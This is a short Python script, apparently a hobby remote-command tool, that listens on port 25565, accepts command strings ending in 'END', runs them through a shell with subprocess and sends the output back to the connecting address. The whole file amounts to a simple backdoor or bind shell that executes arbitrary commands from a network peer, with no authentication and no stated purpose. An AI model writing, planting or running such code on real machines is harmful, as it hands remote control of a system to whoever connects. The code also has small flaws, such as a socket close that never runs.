import socket
import subprocess
import time


def receive_commands(server_sock: socket.socket) -> list:
    buffer = b'0'
    command = b''
    while command[-3:] != b'END':
        buffer = server_sock.recv(2048)
        command += buffer 
    command = command.split(b' ')
    command = command[:-1]
    return command  


def execute_commands(command: list) -> str:
    output = subprocess.run(command, shell=True, capture_output=True, text=True) 
    if output.stdout:
        return output.stdout 
    return output.stderr   


def send_output(sock: socket.socket, output: str, server_ip: str) -> None:
    sock.close()
    time.sleep(1)
    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    new_sock.connect((server_ip, 25565))
    new_sock.send(output.encode('utf-8'))
    new_sock.close()

def main():
    while True:    
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('127.0.0.1', 25565))
        sock.listen()
        server_sock, server_address = sock.accept()
        command = receive_commands(server_sock)
        output = execute_commands(command)
        send_output(sock, output, server_address[0])
    sock.close()


if __name__ == '__main__':
    main()
